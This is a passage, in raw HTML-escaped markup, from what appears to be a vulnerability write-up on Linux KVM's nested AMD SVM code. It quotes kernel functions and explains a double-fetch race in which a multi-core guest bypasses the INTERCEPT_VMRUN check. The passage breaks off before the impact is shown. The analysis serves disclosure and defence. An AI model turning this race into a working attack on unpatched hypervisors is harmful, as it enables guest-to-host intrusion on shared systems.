class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;nested_svm_vmrun_msrpm&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;goto&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;out&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;out_exit_err&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;nested&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;nested_run_pending &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_code &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;SVM_EXIT_ERR&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_code_hi &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_info_1 &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_info_2 &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; nested_svm_vmexit&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;out&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kvm_vcpu_unmap&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;map&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;true&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ret&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c28"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5 c11"&gt;&lt;span class="c0 c25"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c9"&gt;&lt;span class="c25 c6 c29"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;The function first fetches the value of RAX out of the currently active vmcb (&lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;vcmb&lt;/span&gt;&lt;span&gt;) in &lt;/span&gt;&lt;span class="c15"&gt;1 &lt;/span&gt;&lt;span&gt;(numbers are marked in the code samples)&lt;/span&gt;&lt;span&gt;. For guests using nested paging (which is the only relevant configuration nowadays) RAX contains a guest physical address (GPA), which needs to be translated into a host physical address (HPA) first. &lt;/span&gt;&lt;span class="c15"&gt;kvm_vcpu_map&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="c15"&gt;2&lt;/span&gt;&lt;span class="c8"&gt;) takes care of this translation and maps the underlying page to a host virtual address (HVA) that can be directly accessed by KVM. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Once the VMCB is mapped, &lt;/span&gt;&lt;span class="c15"&gt;nested_vmcb_checks&lt;/span&gt;&lt;span&gt;&amp;nbsp;is called for some basic validation in &lt;/span&gt;&lt;span class="c15"&gt;3&lt;/span&gt;&lt;span&gt;. Afterwards, the L1 guest context which is stored in &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;vmcb&lt;/span&gt;&lt;span&gt;&amp;nbsp;is copied into the host save area &lt;/span&gt;&lt;span class="c15"&gt;svm-&amp;gt;nested.hsave&lt;/span&gt;&lt;span&gt;&amp;nbsp;before KVM enters the nested guest context by calling &lt;/span&gt;&lt;span class="c15"&gt;enter_svm_guest_mode&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="c15"&gt;4&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span class="c27 c25"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c25 c27"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f82e68744812c72d77d4c5e87e16205bdffc71d6"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c28"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;enter_svm_guest_mode&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu_svm &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;u64 vmcb12_gpa&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;vmcb12&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ret&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;nested&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;vmcb12_gpa &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb12_gpa&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; load_nested_vmcb_control&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;vmcb12&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; nested_prepare_vmcb_save&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb12&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; nested_prepare_vmcb_control&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ret &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_svm_load_cr3&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb12&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;cr3&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; nested_npt_enabled&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;ret&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ret&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm_set_gif&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;true&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;static&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;void&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;load_nested_vmcb_control&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu_svm &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb_control_area &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; copy_vmcb_control_area&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;nested&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;ctl&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;control&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c9"&gt;&lt;span class="c27 c25"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Looking at &lt;/span&gt;&lt;span class="c15"&gt;enter_svm_guest_mode&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;we can see that KVM copies the vmcb12 control area directly into svm-&amp;gt;nested.ctl and does not perform any further checks on the copied value.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Readers familiar with double fetch or Time-of-Check-to-Time-of-Use vulnerabilities might already see a potential issue here: The call to &lt;/span&gt;&lt;span class="c15"&gt;nested_vmcb_checks&lt;/span&gt;&lt;span&gt;&amp;nbsp;at the beginning of &lt;/span&gt;&lt;span class="c15"&gt;nested_svm_vmrun&lt;/span&gt;&lt;span&gt;&amp;nbsp;performs all of its checks on a copy of the VMCB that is stored in guest memory. This means that a guest with multiple CPU cores can modify fields in the VMCB after they are verified in &lt;/span&gt;&lt;span class="c15"&gt;nested_vmcb_checks&lt;/span&gt;&lt;span&gt;, but before they are copied to svm-&amp;gt;nested.ctl in &lt;/span&gt;&lt;span class="c15"&gt;load_nested_vmcb_control&lt;/span&gt;&lt;span class="c8"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Let&amp;rsquo;s look at &lt;/span&gt;&lt;span class="c15"&gt;nested_vmcb_checks &lt;/span&gt;&lt;span class="c8"&gt;to see what kind of checks we can bypass with this approach: &lt;/span&gt;&lt;/p&gt;&lt;a id="t.cbcfaf5d1ce5a2e639eabbdd57ddd415d5776511"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c28"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;static&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;bool&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_vmcb_check_controls&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb_control_area &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c3"&gt;vmcb_is_intercept&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;INTERCEPT_VMRUN&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;asid &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;nested_ctl &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;SVM_NESTED_CTL_NP_ENABLE&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;!&lt;/span&gt;&lt;span class="c3"&gt;npt_enabled&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;true&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;At first glance this looks pretty harmless. &lt;/span&gt;&lt;span class="c15"&gt;control-&amp;gt;asid&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;isn&amp;rsquo;t used anywhere and the last check is only relevant for systems where nested paging isn&amp;rsquo;t supported. However, the first check turns out to be very interesting. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;For reasons unknown to me, SVM VMCBs contain a bit that enables or disables interception of the VMRUN instruction when executed inside a guest. Clearing this bit isn&amp;rsquo;t actually supported by hardware and results in an immediate VMEXIT, so the check in &lt;/span&gt;&lt;span class="c15"&gt;nested_vmcb_check_controls&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;simply replicates this behavior. &amp;nbsp;When we race and bypass the check by repeatedly flipping the value of the INTERCEPT_VMRUN bit, we can end up in a situation where svm-&amp;gt;nested.ctl contains a 0 in place of the INTERCEPT_VMRUN bit. To understand the impact we first need to see how nested vmexit&amp;rsquo;s are handled in KVM: &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;The main SVM exit handler is the function &lt;/span&gt;&lt;span class="c15"&gt;handle_exit&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" 